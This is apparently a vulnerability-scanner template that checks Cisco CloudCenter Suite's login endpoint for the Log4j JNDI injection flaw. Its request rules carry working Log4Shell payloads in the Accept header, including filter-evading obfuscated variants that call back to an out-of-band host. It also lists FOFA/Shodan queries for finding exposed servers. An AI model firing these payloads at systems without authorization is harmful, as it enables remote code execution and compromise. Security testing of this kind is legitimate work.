id: cisco-cloudcenter-suite-log4j-rce

info:
  name: Cisco CloudCenter Suite (Log4j) - Remote Code Execution
  author: pwnhxl
  severity: critical
  verified: false
  description: |
    Cisco CloudCenter Suite is susceptible to remote code execution via the Apache Log4j library. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI-related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
    FOFA: title="CloudCenter Suite"
    SHODAN: title:"CloudCenter Suite"
  reference:
    - https://logging.apache.org/log4j/2.x/security.html
    - http://www.openwall.com/lists/oss-security/2021/12/10/1
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  solutions: From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.
  tags: cve,cve2021,jndi,log4j,rce,oast,cloudcenter,cisco,kev
  created: 2023/07/02

set:
  randstr: randomLowercase(6)
  reverse: newReverse()
  reverseHost: reverse.url.host
rules:
  r0:
    request:
      method: POST
      path: /suite-auth/login
      headers:
        Accept: application/json, text/plain, */${jndi:ldap://{{reverseHost}}}
        Content-Type: application/json
      body: |
        {"username":"{{randstr}}@{{randstr}}.com","password":"{{randstr}}","tenantName":"{{randstr}}"}
    expression: reverse.wait(5)
  r1:
    request:
      method: POST
      path: /suite-auth/login
      headers:
        Accept: application/json, text/plain, */${jndi:ldap:${::-/}${::-/}{{reverseHost}}}
        Content-Type: application/json
      body: |
        {"username":"{{randstr}}@{{randstr}}.com","password":"{{randstr}}","tenantName":"{{randstr}}"}
    expression: reverse.wait(5)
  r2:
    request:
      method: POST
      path: /suite-auth/login
      headers:
        Accept: application/json, text/plain, */${${X::-j}ndi:rmi:${::-/}${X::-/}{{reverseHost}}}
        Content-Type: application/json
      body: |
        {"username":"{{randstr}}@{{randstr}}.com","password":"{{randstr}}","tenantName":"{{randstr}}"}
    expression: reverse.wait(5)
  r3:
    request:
      method: POST
      path: /suite-auth/login
      headers:
        Accept: application/json, text/plain, */${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{reverseHost}}}
        Content-Type: application/json
      body: |
        {"username":"{{randstr}}@{{randstr}}.com","password":"{{randstr}}","tenantName":"{{randstr}}"}
    expression: reverse.wait(5)
expression: r0() || r1()|| r2() || r3()